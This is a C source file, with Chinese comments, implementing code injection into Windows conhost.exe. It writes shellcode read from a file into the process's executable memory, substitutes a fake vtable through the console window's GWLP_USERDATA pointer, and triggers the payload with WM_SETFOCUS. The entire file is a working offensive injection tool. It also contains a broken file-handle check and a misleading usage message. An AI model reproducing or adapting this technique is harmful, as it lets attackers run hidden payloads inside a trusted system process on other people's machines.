#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#define MAXMUM_CLASS_NAME 256


typedef struct _vftable_t {
	ULONG_PTR     EnableBothScrollBars;
	ULONG_PTR     UpdateScrollBar;
	ULONG_PTR     IsInFullscreen;
	ULONG_PTR     SetIsFullscreen;
	ULONG_PTR     SetViewportOrigin;
	ULONG_PTR     SetWindowHasMoved;
	ULONG_PTR     CaptureMouse;
	ULONG_PTR     ReleaseMouse;
	ULONG_PTR     GetWindowHandle;
	ULONG_PTR     SetOwner;
	ULONG_PTR     GetCursorPosition;
	ULONG_PTR     GetClientRectangle;
	ULONG_PTR     MapPoints;
	ULONG_PTR     ConvertScreenToClient;
	ULONG_PTR     SendNotifyBeep;
	ULONG_PTR     PostUpdateScrollBars;
	ULONG_PTR     PostUpdateTitleWithCopy;
	ULONG_PTR     PostUpdateWindowSize;
	ULONG_PTR     UpdateWindowSize;
	ULONG_PTR     UpdateWindowText;
	ULONG_PTR     HorizontalScroll;
	ULONG_PTR     VerticalScroll;
	ULONG_PTR     SignalUia;
	ULONG_PTR     UiaSetTextAreaFocus;
	ULONG_PTR     GetWindowRect;
} ConsoleWindow;

// just here for reference. it's not used here.
typedef struct _userData_t {
	ULONG_PTR vTable;     // gets replaced with new table pointer
	ULONG_PTR pUnknown;   // some undefined memory pointer
	HWND      hWnd;
	BYTE      buf[100];   // don't care
} UserData;


int pre_test()
{
	char* ClassName = NULL;
	int length = 0;


	do
	{
		//找到目标窗口
		HWND hWND = FindWindow(NULL, "命令提示符");
		if (NULL == hWND)
			break;

		//获得控制台宿主程序的Class Name,即"ConsoleWindowClass"
		ClassName = (char*)LocalAlloc(0, MAXMUM_CLASS_NAME);
		if (NULL == ClassName)
			break;

		memset(ClassName, 0, MAXMUM_CLASS_NAME);

		length = GetClassName(hWND, ClassName, MAXMUM_CLASS_NAME);
		if (length == 0)
			break;
		printf("conhost class name: %s\r\n", ClassName);


		//获得userdata,使用windbg 的 dps poi(user_data)指令可以看见user_data处存放着一个vtable
		ULONG_PTR user_data = GetWindowLongPtr(hWND, GWLP_USERDATA);


		//在userdata处下读断点后向窗口发送该消息,可以发现其中一个虚函数 GetWindowHandle被调用
		SendMessage(hWND, WM_SETFOCUS, 0, 0);

	} while (FALSE);


	if (ClassName != NULL)
	{
		LocalFree(ClassName);
	}
	return 0;
}

DWORD conhostId(DWORD ppid)
{
	HANDLE hSnapShot = NULL;
	PROCESSENTRY32 pe32 = { 0 };
	DWORD dwPid = 0;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapShot == INVALID_HANDLE_VALUE)
		return 0;

	if (Process32First(hSnapShot, &pe32))
	{
		do
		{
			//conhost?
			if (_strcmpi("conhost.exe", pe32.szExeFile) == 0)
			{
				//child process?
				if (pe32.th32ParentProcessID == ppid)
				{
					dwPid = pe32.th32ProcessID;
					break;
				}

			}

		} while (Process32Next(hSnapShot,&pe32));
	}
	CloseHandle(hSnapShot);

	return dwPid;
}

void inject_conhost(PVOID payload, DWORD payloadSize, CHAR* windowName)
{
	HWND hWnd = NULL;
	DWORD parentPID = 0,PID = 0 ;
	HANDLE hProcess = NULL;
	LPVOID RemotePayload = NULL,oldVtable =NULL;
	LPVOID FakeVtable = NULL;
	SIZE_T ReturnLength = 0;
	LONG_PTR lpTable = 0;
	LONG_PTR oldVtableAddr = 0;
	ConsoleWindow cw = { 0 };

	//1.找到目标窗口,当windowName为空时随意找一个控制台程序
	hWnd = FindWindow("ConsoleWindowClass", windowName);

	GetWindowThreadProcessId(hWnd, &parentPID);

	//2.获得conhost.exe的进程id
	PID = conhostId(parentPID);

	//3.打开目标conhost.exe
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (hProcess==NULL)
	{
		return;
	}

	//4.为payload申请可读写可执行内存,并写入payload
	RemotePayload = VirtualAllocEx(hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (RemotePayload == NULL)
	{
		CloseHandle(hProcess);
		return;
	}

	if (!WriteProcessMemory(hProcess, RemotePayload, payload, payloadSize, &ReturnLength))
	{
		CloseHandle(hProcess);
		return;
	}
	
	//5.读取当前虚表地址  .懒得判断有效性了,直接读写吧
	lpTable = GetWindowLongPtr(hWnd, GWLP_USERDATA);
	ReadProcessMemory(hProcess, (LPCVOID)lpTable, &oldVtableAddr, sizeof(ULONG_PTR), &ReturnLength);

	//6.保存当前虚表
	LONG_PTR table = lpTable;
	ReadProcessMemory(hProcess, (LPCVOID)oldVtableAddr, &cw, sizeof(ConsoleWindow), &ReturnLength);

	//7.为新的虚表申请可读写内存
	FakeVtable = VirtualAllocEx(hProcess, NULL, sizeof(ConsoleWindow), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	//8.写入新虚表
	cw.GetWindowHandle = (ULONG_PTR)RemotePayload;
	WriteProcessMemory(hProcess, FakeVtable, &cw, sizeof(ConsoleWindow), &ReturnLength);

	//9.更新虚表指针
	WriteProcessMemory(hProcess, (LPVOID)table, &FakeVtable, sizeof(ULONG_PTR), &ReturnLength);

	//10.触发payload执行
	SendMessage(hWnd, WM_SETFOCUS, 0, 0);

	//11.恢复虚表指针
	WriteProcessMemory(hProcess, (LPVOID)table, &oldVtableAddr, sizeof(ULONG_PTR), &ReturnLength);

	///12.释放申请的远程内存
	VirtualFreeEx(hProcess, RemotePayload, 0, MEM_DECOMMIT | MEM_RELEASE);
	VirtualFreeEx(hProcess, FakeVtable, 0, MEM_DECOMMIT | MEM_RELEASE);

	CloseHandle(hProcess);



}

DWORD read_payload(CHAR* path, PVOID &payload)
{
	DWORD dwRet = 0;
	HANDLE hFile = NULL;

	do 
	{
		hFile = CreateFile(path,
			GENERIC_READ | GENERIC_WRITE,
			0,
			NULL,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,
			NULL);

		if (NULL == INVALID_HANDLE_VALUE)
		{
			break;
		}

		dwRet = GetFileSize(hFile, NULL);

		payload = LocalAlloc(0, dwRet + 16);

		if (!ReadFile(hFile, payload, dwRet, &dwRet, NULL))
		{
			break;
		}

		CloseHandle(hFile);
		return dwRet;

	} while (FALSE);


	
	if (hFile != NULL&&hFile != INVALID_HANDLE_VALUE)
	{
		CloseHandle(hFile);
	}
	return 0;

}



int main()
{
	int argc = __argc;
	char** argv = __argv;
	DWORD payloadSize = 0;
	PVOID payload = NULL;
	if (argc != 2)
	{
		printf("Usage: dll_path\r\n");
		return 0;
	}
	//先在调试器里进行一些测试
	pre_test();

	//读入shellcode
	payloadSize = read_payload(argv[1], payload);

	//任意注入一个conhost.exe
	inject_conhost(payload, payloadSize, "命令提示符");

	LocalFree(payload);
	return 0;
}